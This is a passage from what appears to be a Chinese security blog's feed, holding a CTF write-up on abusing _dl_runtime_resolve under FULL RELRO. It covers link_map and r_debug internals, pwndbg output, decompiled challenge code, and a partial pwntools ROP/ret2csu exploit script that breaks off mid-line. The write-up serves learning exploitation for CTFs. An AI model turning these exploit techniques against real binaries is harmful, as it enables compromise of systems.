    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;CVE-2016-5195就是非常出名的&lt;code&gt;Dirty COW&lt;/code&gt;，俗称&lt;code&gt;脏牛漏洞&lt;/code&gt;。攻击者可以通过</summary>
      
    
    
    
    <category term="Linux Kernel" scheme="https://196082.github.io/categories/Linux-Kernel/"/>
    
    <category term="CVE复现" scheme="https://196082.github.io/categories/Linux-Kernel/CVE%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="page fault" scheme="https://196082.github.io/tags/page-fault/"/>
    
    <category term="COW" scheme="https://196082.github.io/tags/COW/"/>
    
    <category term="Race condition" scheme="https://196082.github.io/tags/Race-condition/"/>
    
  </entry>
  
  <entry>
    <title>dl-runtime-resolve重温</title>
    <link href="https://196082.github.io/2023/07/28/dl-runtime-resolve/"/>
    <id>https://196082.github.io/2023/07/28/dl-runtime-resolve/</id>
    <published>2023-07-28T14:27:42.000Z</published>
    <updated>2023-10-27T08:39:07.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在先前其实我已经写过一篇<a class="link"   href="https://cv196082.gitee.io/2022/02/03/ret2dl-runtime-resolve/" >ret2dl-runtime-resolve<i class="fas fa-external-link-alt"></i></a>了。不过在那篇文章中并没有提到当<code>RELRO</code>的等级为<code>FULL</code>的情况下该如何进行利用方法。又因为这类题目一般来说就是模板题目的缘故所以我也就一直没有放在心上，直到这一次巅峰极客遇到了这样一道题目。事先需要提到的是，这道题其实是具有更简单的解题方法的，那就是将got表中read的函数地址写到bss中，随后修改便宜直接调用syscall即可。不过既然取名叫<code>link_map</code>也导致我头铁到一直尝试<code>_dl_runtime_resolve</code>的方式去解决，所以后续的题目都没看。</p><p>因为内核玩的比较多，所以下来看了那一道内核题，题目给的驱动是没有漏洞的，但是因为没有加任何锁的缘故并且内核版本为5.10.x所以可以直接使用<a class="link"   href="https://cv196082.gitee.io/2022/09/06/kernel%E5%A0%86%E5%8D%A0%E4%BD%8D/" >堆占位技术<i class="fas fa-external-link-alt"></i></a>直接造成UAF，还算是比较简单，所以不会单独写文章进行复现。</p><h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><h3 id="Full和Partial的区别"><a href="#Full和Partial的区别" class="headerlink" title="Full和Partial的区别"></a>Full和Partial的区别</h3><p>首先最直接的区别就是在Full的情况下got表是不可写的，并且所有符号的在在开始时就会被解析，<code>.got.plt</code>段会被完全初始化为目标函数的最终地址。这也就导致<code>link_map</code>和<code>_dl_runtime_resolve</code>不会被加载。所以首先需要的就是泄漏出<code>link_map</code>和<code>_dl_runtime_resolve</code>函数。</p><h3 id="利用的必要条件"><a href="#利用的必要条件" class="headerlink" title="利用的必要条件"></a>利用的必要条件</h3><p>一、栈溢出</p><p>二、存在一个任意地址读取并且能写到任意地址</p><p>其实有了如上条件之后依旧可以选择的更简单的方式就是读取got表中<code>read</code>函数的地址，并且进行<code>partial write</code>使其最终指向<code>syscall</code>。</p><h3 id="获取link-map"><a href="#获取link-map" class="headerlink" title="获取link_map"></a>获取link_map</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">LOAD:0000000000600E10 0C 00 00 00 00 00 00 00 B0 04+Elf64_Dyn &lt;0Ch, 4004B0h&gt;                ; DT_INIT</span><br><span class="line">LOAD:0000000000600E20 0D 00 00 00 00 00 00 00 F4 07+Elf64_Dyn &lt;0Dh, 4007F4h&gt;                ; DT_FINI</span><br><span class="line">LOAD:0000000000600E30 19 00 00 00 00 00 00 00 E8 0D+Elf64_Dyn &lt;19h, 600DE8h&gt;                ; DT_INIT_ARRAY</span><br><span class="line">LOAD:0000000000600E40 1B 00 00 00 00 00 00 00 08 00+Elf64_Dyn &lt;1Bh, 8&gt;                      ; DT_INIT_ARRAYSZ</span><br><span class="line">LOAD:0000000000600E50 1A 00 00 00 00 00 00 00 F0 0D+Elf64_Dyn &lt;1Ah, 600DF0h&gt;                ; DT_FINI_ARRAY</span><br><span class="line">LOAD:0000000000600E60 1C 00 00 00 00 00 00 00 08 00+Elf64_Dyn &lt;1Ch, 8&gt;                      ; DT_FINI_ARRAYSZ</span><br><span class="line">LOAD:0000000000600E70 F5 FE FF 6F 00 00 00 00 98 02+Elf64_Dyn &lt;6FFFFEF5h, 400298h&gt;          ; DT_GNU_HASH</span><br><span class="line">LOAD:0000000000600E80 05 00 00 00 00 00 00 00 78 03+Elf64_Dyn &lt;5, 400378h&gt;                  ; DT_STRTAB</span><br><span class="line">LOAD:0000000000600E90 06 00 00 00 00 00 00 00 D0 02+Elf64_Dyn &lt;6, 4002D0h&gt;                  ; DT_SYMTAB</span><br><span class="line">LOAD:0000000000600EA0 0A 00 00 00 00 00 00 00 64 00+Elf64_Dyn &lt;0Ah, 64h&gt;                    ; DT_STRSZ</span><br><span class="line">LOAD:0000000000600EB0 0B 00 00 00 00 00 00 00 18 00+Elf64_Dyn &lt;0Bh, 18h&gt;                    ; DT_SYMENT</span><br><span class="line">LOAD:0000000000600EC0 15 00 00 00 00 00 00 00 00 00+Elf64_Dyn &lt;15h, 0&gt;                      ; DT_DEBUG</span><br><span class="line">LOAD:0000000000600ED0 03 00 00 00 00 00 00 00 C0 0F+Elf64_Dyn &lt;3, 600FC0h&gt;                  ; DT_PLTGOT</span><br><span class="line">LOAD:0000000000600EE0 07 00 00 00 00 00 00 00 20 04+Elf64_Dyn &lt;7, 400420h&gt;                  ; DT_RELA</span><br><span class="line">LOAD:0000000000600EF0 08 00 00 00 00 00 00 00 90 00+Elf64_Dyn &lt;8, 90h&gt;                      ; DT_RELASZ</span><br><span class="line">LOAD:0000000000600F00 09 00 00 00 00 00 00 00 18 00+Elf64_Dyn &lt;9, 18h&gt;                      ; DT_RELAENT</span><br><span class="line">LOAD:0000000000600F10 18 00 00 00 00 00 00 00 00 00+Elf64_Dyn &lt;18h, 0&gt;                      ; DT_BIND_NOW</span><br><span class="line">LOAD:0000000000600F20 FB FF FF 6F 00 00 00 00 01 00+Elf64_Dyn &lt;6FFFFFFBh, 1&gt;                ; DT_FLAGS_1</span><br><span class="line">LOAD:0000000000600F30 FE FF FF 6F 00 00 00 00 F0 03+Elf64_Dyn &lt;6FFFFFFEh, 4003F0h&gt;          ; DT_VERNEED</span><br><span class="line">LOAD:0000000000600F40 FF FF FF 6F 00 00 00 00 01 00+Elf64_Dyn &lt;6FFFFFFFh, 1&gt;                ; DT_VERNEEDNUM</span><br><span class="line">LOAD:0000000000600F50 F0 FF FF 6F 00 00 00 00 DC 03+Elf64_Dyn &lt;6FFFFFF0h, 4003DCh&gt;          ; DT_VERSYM</span><br><span class="line">LOAD:0000000000600F60 00 00 00 00 00 00 00 00 00 00+Elf64_Dyn &lt;0&gt;                           ; DT_NULL</span><br></pre></td></tr></table></figure><p>在入口处存在一个<code>.dynmic</code>叫做<code>DT_DEBUG</code>，由调试器使用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Sxwordd_tag;<span class="comment">/* Dynamic entry type */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      Elf64_Xword d_val;<span class="comment">/* Integer value */</span></span><br><span class="line">      Elf64_Addr d_ptr;<span class="comment">/* Address value */</span></span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf64_Dyn;</span><br></pre></td></tr></table></figure><p>这里的<code>d_ptr</code>位置只想的是<code>r_debug</code>结构体。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">r_debug</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="comment">/* Version number for this protocol.  It should be greater than 0.  */</span></span><br><span class="line">    <span class="keyword">int</span> r_version;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">r_map</span>;</span><span class="comment">/* Head of the chain of loaded objects.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* This is the address of a function internal to the run-time linker,</span></span><br><span class="line"><span class="comment">       that will always be called when the linker begins to map in a</span></span><br><span class="line"><span class="comment">       library or unmap it, and again when the mapping change is complete.</span></span><br><span class="line"><span class="comment">       The debugger can set a breakpoint at this address if it wants to</span></span><br><span class="line"><span class="comment">       notice shared object mapping changes.  */</span></span><br><span class="line">    ElfW(Addr) r_brk;</span><br><span class="line">    <span class="class"><span class="keyword">enum</span></span></span><br><span class="line"><span class="class">      &#123;</span></span><br><span class="line"><span class="comment">/* This state value describes the mapping change taking place when</span></span><br><span class="line"><span class="comment">   the `r_brk&#x27; address is called.  */</span></span><br><span class="line">RT_CONSISTENT,<span class="comment">/* Mapping change is complete.  */</span></span><br><span class="line">RT_ADD,<span class="comment">/* Beginning to add a new object.  */</span></span><br><span class="line">RT_DELETE<span class="comment">/* Beginning to remove an object mapping.  */</span></span><br><span class="line">      &#125; r_state;</span><br><span class="line"></span><br><span class="line">    ElfW(Addr) r_ldbase;<span class="comment">/* Base address the linker is loaded at.  */</span></span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure><p>可以看到中间的<code>r_map</code>就是指向<code>link_map</code>的地址了。</p><h3 id="获得-dl-runtime-resolve"><a href="#获得-dl-runtime-resolve" class="headerlink" title="获得_dl_runtime_resolve"></a>获得_dl_runtime_resolve</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="comment">/* These first few members are part of the protocol with the debugger.</span></span><br><span class="line"><span class="comment">       This is the same format used in SVR4.  */</span></span><br><span class="line"></span><br><span class="line">    ElfW(Addr) l_addr;<span class="comment">/* Difference between the address in the ELF</span></span><br><span class="line"><span class="comment">   file and the addresses in memory.  */</span></span><br><span class="line">    <span class="keyword">char</span> *l_name;<span class="comment">/* Absolute file name object was found in.  */</span></span><br><span class="line">    ElfW(Dyn) *l_ld;<span class="comment">/* Dynamic section of the shared object.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>, *<span class="title">l_prev</span>;</span> <span class="comment">/* Chain of loaded objects.  */</span></span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure><p>可以看出来<code>link_map</code>其实是一个双向链表的形式，而且其中存在一个相当有用的成员<code>l_info</code>。而其中的<code>DT_PLTGOT</code>的<code>d_tag</code>存放的是got表的地址，那么可以经过多次的<code>l_next</code>的查找得到libc的got表地址进而获得<code>_dl_runtime_resolve</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x *((struct link_map*)0x7fd64bb592e0)-&gt;l_next-&gt;l_next-&gt;l_info[3]</span><br><span class="line"><span class="variable">$13</span> = &#123;</span><br><span class="line">  d_tag = 0x3,</span><br><span class="line">  d_un = &#123;</span><br><span class="line">    d_val = 0x7fd64bb05000,</span><br><span class="line">    d_ptr = 0x7fd64bb05000</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; telescope 0x7fd64bb05000</span><br><span class="line">00:0000│  0x7fd64bb05000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x218bc0</span><br><span class="line">01:0008│  0x7fd64bb05008 (_GLOBAL_OFFSET_TABLE_+8) —▸ 0x7fd64bb1c160 —▸ 0x7fd64b8ec000 ◂— 0x3010102464c457f</span><br><span class="line">02:0010│  0x7fd64bb05010 (_GLOBAL_OFFSET_TABLE_+16) —▸ 0x7fd64bb33c60 (_dl_runtime_resolve_xsave) ◂— endbr64</span><br><span class="line">03:0018│  0x7fd64bb05018 (*ABS*@got.plt) —▸ 0x7fd64ba89b20 (__strnlen_avx2) ◂— endbr64</span><br><span class="line">04:0020│  0x7fd64bb05020 (*ABS*@got.plt) —▸ 0x7fd64ba85750 (__rawmemchr_avx2) ◂— endbr64</span><br><span class="line">05:0028│  0x7fd64bb05028 (realloc@got.plt) —▸ 0x7fd64b914030 ◂— endbr64</span><br><span class="line">06:0030│  0x7fd64bb05030 (*ABS*@got.plt) —▸ 0x7fd64ba87970 (__strncasecmp_avx) ◂— endbr64</span><br><span class="line">07:0038│  0x7fd64bb05038 (_dl_exception_create@got.plt) —▸ 0x7fd64b914050 ◂— endbr64</span><br></pre></td></tr></table></figure><p>可以看到<code>_dl_runtime_resolve_xsave</code>函数就在偏移为<code>0x10</code>的位置了。</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  sub_40071B();</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目的代码很简单，<code>main</code>函数就只有这几行代码，并且没有任何输出函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_400606</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+14h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = *(_QWORD *)(qword_601040 + (<span class="keyword">int</span>)a1);</span><br><span class="line">  qword_601040 = v4;</span><br><span class="line">  result = a1;</span><br><span class="line">  dword_601048 = a1;</span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = v4;</span><br><span class="line">    qword_601028[a3] = v4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( !a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    result = v4;</span><br><span class="line">    qword_601020[a3] = v4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一段函数则是刚好满足第二个函数，能够实现任意地址读取之后写入到任意地址。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>因为前面已经提到了利用原理，这里就不多赘述直接上exp吧。</p><p>因为我的exp是边打边写的，所以写得像一坨shit所以我在每一步都加了注释方便理解。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ezzzz&#x27;</span>)</span><br><span class="line">r = process(<span class="string">&#x27;./ezzzz&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x00000000004007e3</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x00000000004007e1</span></span><br><span class="line">bss = <span class="number">0x601040</span></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x400740</span></span><br><span class="line"></span><br><span class="line">gadget_for_read = <span class="number">0x400606</span></span><br><span class="line">gadget_for_write = <span class="number">0x40067C</span></span><br><span class="line">gadget_csu = <span class="number">0x4007DA</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造成read一次之后返回到main</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, pop_rdi, <span class="number">0</span>, pop_rsi_r15, bss, <span class="number">0</span>, read_plt, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在固定位置写上经过csu之后需要跳转的函数位置</span></span><br><span class="line">r.sendline(flat(bss + <span class="number">0x10</span>, gadget_for_read, <span class="number">0xBEEFDEAD</span>))</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过csu调用到gadget_for_read，目的是将BEEDDEAD读取到0x601030</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, gadget_csu, <span class="number">0</span>, <span class="number">1</span>, bss + <span class="number">8</span>, <span class="number">1</span>,</span><br><span class="line">               <span class="number">1</span>, <span class="number">0</span>, <span class="number">0x4007C0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>*<span class="number">7</span>, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 一样的为后续做准备，这里将0x601050和0x601040的指设置为(0x600EC0 + 0x8)也就是DT_DEBUG</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, pop_rdi, <span class="number">0</span>, pop_rsi_r15, bss, <span class="number">0</span>, read_plt, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">r.sendline(flat(<span class="number">0x600EC0</span> + <span class="number">0x8</span>, gadget_for_read, <span class="number">0x600EC0</span> + <span class="number">0x8</span>))</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里就是读取DT_DEBUG中的d_ptr的值，并写到0x601040的位置</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, gadget_csu, <span class="number">0</span>, <span class="number">1</span>, bss + <span class="number">8</span>,</span><br><span class="line">               <span class="number">3</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0x4007C0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>*<span class="number">7</span>, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">bss = bss+<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置a1为8，读取r_debug中的d_val值(即为link_map)并存放在0x601040位置</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, pop_rdi, <span class="number">0</span>, pop_rsi_r15, bss, <span class="number">0</span>, read_plt, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">r.sendline(flat(<span class="number">0x601028</span>, gadget_for_read, <span class="number">0x600EC0</span> + <span class="number">0x8</span>))</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, gadget_csu, <span class="number">0</span>, <span class="number">1</span>, bss + <span class="number">8</span>,</span><br><span class="line">               <span class="number">3</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">0x4007C0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>*<span class="number">7</span>, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置a1位-0x54680 + 8，获得link_map-&gt;l_next-&gt;l_next-&gt;l_info[3]的值(即为libc的got表地址)并存放在0x601040的位置</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, pop_rdi, <span class="number">0</span>, pop_rsi_r15, bss, <span class="number">0</span>, read_plt, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">r.sendline(flat(<span class="number">0x601028</span>, gadget_for_read, <span class="number">0x600EC0</span> + <span class="number">0x8</span>))</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, gadget_csu, <span class="number">0</span>, <span class="number">1</span>, bss + <span class="number">8</span>,</span><br><span class="line">               <span class="number">3</span>, <span class="number">1</span>, -<span class="number">0x54680</span> + <span class="number">8</span>, <span class="number">0x4007C0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>*<span class="number">7</span>, 